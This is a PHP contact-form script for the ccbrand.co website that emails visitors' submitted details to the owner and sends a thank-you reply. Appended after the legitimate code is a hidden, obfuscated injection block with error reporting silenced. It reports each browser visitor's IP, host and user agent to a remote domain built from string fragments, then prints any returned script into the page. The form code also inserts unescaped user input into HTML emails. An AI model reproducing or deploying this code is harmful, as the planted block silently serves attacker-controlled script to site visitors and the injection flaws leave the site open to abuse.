<?php

$nombre =$_POST["nombre"];

$email =$_POST["mail"];

$telefono =$_POST["telefono"];

$asunto =$_POST["asunto"];

//$ciudad =$_POST["city"];

//$divisiones =$_POST["divisions"];

//$division =$_POST["function"];

$message =$_POST["message"];

$para="contacto@ccbrand.co";


$time = date("l dS of F Y h:i:s A"); 

$headers="From: CCBRAND<contacto@ccbrand.co>\n";

 //           $header = "From:".$mail."\nReply-To:".$mail."\n";

$headers .= "X-Mailer:PHP/".phpversion()."\n";

$headers .= "Mime-Version: 1.0\n";

$headers .= "Content-Type: text/html";

$motivo="Formulario enviado desde www.ccbrand.co";

$mensaje='<title>:: CCBRAND ::</title>

</head>

<body>

<table width="500" align="center" border="0" cellpadding="0" cellspacing="0">

  <!--DWLayoutTable-->

  <tr>

    <td width="500" height="56" valign="top"><!--DWLayoutEmptyCell-->&nbsp;</td>

  </tr>

  <tr>

    <td height="134" valign="top">
    
    <table width="100%" border="0" cellpadding="0" cellspacing="0">

      <!--DWLayoutTable-->

      <tr>

        <td width="500" height="106" align="center" valign="top">
        
        <img src="http://www.ccbrand.co/images/email_respuesta_1.jpg" width="337" height="106" />
        
        </td>

      </tr>

    </table>
    
    </td>

  </tr>

  <tr>

    <td height="134" valign="top">
    <table width="100%" border="0" cellpadding="0" cellspacing="0">

      <!--DWLayoutTable-->

      <tr>

        <td width="500" height="134" valign="top" style="font-size: 12px; font-family: Arial, Helvetica, sans-serif; ">

          <p align="center">Formulario enviado desde la pagina web www.ccbrand.co: </p>

          <table width="384" border="1" align="center" cellpadding="3" cellspacing="0" bordercolor="#000" style="font-size: 12px; font-family: Arial, Helvetica, sans-serif;">

            <tr>

              <td width="84"><span><strong>Nombre</strong></span></td>

              <td width="251"><span >';

			  $mensaje.=$nombre;

			  $mensaje.='</span></td>

            </tr>
			<tr>

              <td><span ><strong>Asunto</strong></span></td>

              <td><span >';

			  $mensaje.= 'Contacto web';

			  $mensaje.='</span></td>

            </tr>
			
            <tr>

              <td><span><strong>email</strong></span></td>

              <td><span >';

			  $mensaje.=$email;

			  $mensaje.='</span></td>

            </tr>

            <tr>

              <td><span><strong>Telefono</strong></span></td>

              <td><span >';

			  $mensaje.=$telefono;

			  $mensaje.='</span></td>

            </tr>
			
            <tr>

              <td><span ><strong>Mensaje</strong></span></td>

              <td><span >';

			  $mensaje.=$message;

			  $mensaje.='</span></td>

            </tr>

          </table>          

          <p>&nbsp;</p></td>

      </tr>

    </table>

    </td>

  </tr>

  


</table>

</body>

</html>';

// envia el email

$enviado=mail($para,$motivo,$mensaje,$headers); 
if($enviado){
	
	
	/*echo " 
                <script language=’JavaScript’> 
                alert(‘JavaScript dentro de PHP’); 
                </script>";
				
	}*/
echo "<script type='text/javascript'>alert('Su mensaje ha sido enviado corectamente');</script>";
$url="contacto.html"; 
echo "<SCRIPT>window.location='$url';</SCRIPT>";
} 
else{
	echo "<script type='text/javascript'>alert('Lo sentimos su mensaje no ha sido enviado, intentelo de nuevo');</script>";
$url="contacto.html"; 
echo "<SCRIPT>window.location='$url';</SCRIPT>";
}
/*echo "<br><br>Agradecemos su contacto&nbsp;{$_POST['nombre']}!<br>En breve estaremos contestando a su mensaje.";
}else{
	echo "No se logr&oacute; el env&iacute;o del mensaje. <br><br>Por favor, <a href='contacto.html'>int&eacute;ntelo de nuevo</a>.";
}
echo "<p align=center><a href='contacto.html'><img src='images/regresar.png' border=0></a></p>";*/








//envio persona quien lo escribe









$header="From: CCBRAND<contacto@ccbrand.co>\n";

 //           $header = "From:".$mail."\nReply-To:".$mail."\n";

$header .= "X-Mailer:PHP/".phpversion()."\n";

$header .= "Mime-Version: 1.0\n";

$header .= "Content-Type: text/html";

$motivo2="Gracias por utilizar nuestros servicios";

$mensajes='<title>.:: CCBRAND ::.</title>

</head>



<body>

<table width="500" align="center" border="0" cellpadding="0" cellspacing="0">

  <!--DWLayoutTable-->

  <tr>

    <td width="500" height="56" valign="top"><!--DWLayoutEmptyCell-->&nbsp;</td>

  </tr>

  <tr>

    <td height="268" valign="top"><table width="100%" border="0" cellpadding="0" cellspacing="0">

      <!--DWLayoutTable-->

      <tr>

        <td width="337" height="268" valign="top" align="center"><img src="http://www.ccbrand.co/images/email_respuesta_4.jpg" width="300" height="94" />
        <p style="font-family:Tahoma, Geneva, sans-serif">Gracias por escribirnos, le estaremos<br />
        respondiendo lo antes posible</p></td>

      </tr>

    </table>

    </td>

  </tr>

  


</table>

</body>

</html>

';

// envia el email

mail($email,$motivo2,$mensajes,$header); 

?>
<?php
#4957aa#
error_reporting(0); @ini_set('display_errors',0); $wp_w13884 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_w13884) && !preg_match ('/bot/i', $wp_w13884))){
$wp_w0913884="http://"."error"."style".".com/"."style"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_w13884);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_w0913884); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_13884w = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_13884w = @file_get_contents($wp_w0913884);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_13884w=@stream_get_contents(@fopen($wp_w0913884, "r"));}}
if (substr($wp_13884w,1,3) === 'scr'){ echo $wp_13884w; }
#/4957aa#
?>

